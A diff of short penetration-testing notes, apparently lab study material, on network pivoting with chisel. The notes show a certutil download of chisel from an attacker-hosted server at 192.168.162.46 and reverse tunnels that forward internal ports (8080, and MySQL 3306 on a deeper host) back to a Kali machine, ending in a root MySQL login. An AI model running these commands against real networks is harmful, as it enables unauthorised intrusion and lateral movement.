@@ -28,18 +28,19 @@ cd ~/tools/privesc_windows
 python3 -m http.server 80
 certutil -urlcache -split -f http://192.168.162.46:80/chisel-amd64.exe  
 
-Kali Server  
-./chisel-linux64 server --reverse --port 443  
-
-Windows Connect  
-chisel-amd64.exe client 192.168.162.46:443 R:8080:localhost:8080  
-  
-Kali Firefox  
-firefox 127.0.0.1:8080  
-
+Connect
+kali> chisel-linux64 server --reverse --port 443  -v
+wind> chisel-amd64.exe client 192.168.162.46:443 R:8080:localhost:8080  
+kali> firefox 127.0.0.1:8080  
 
 ---------------------
-Windows Pivot to Samba
+Windows-Chisel to Deeper-Windows
+kali> chisel-linux64 server --reverse --port 443 -v
+wind> chisel-amd64.exe client 192.168.162.46:443 R:127.0.0.1:3306:deeperbox:3306
+kali> mysql --host=127.0.0.1 --port=3306 --user=root -p
+
+---------------------
+Linux-Pivot to Deeper-Windows
 Found SMB on Remote Box
 Get access to the SMB on deeper box. 
 Forward a 'deeper' windows-target-smb port back to kali 
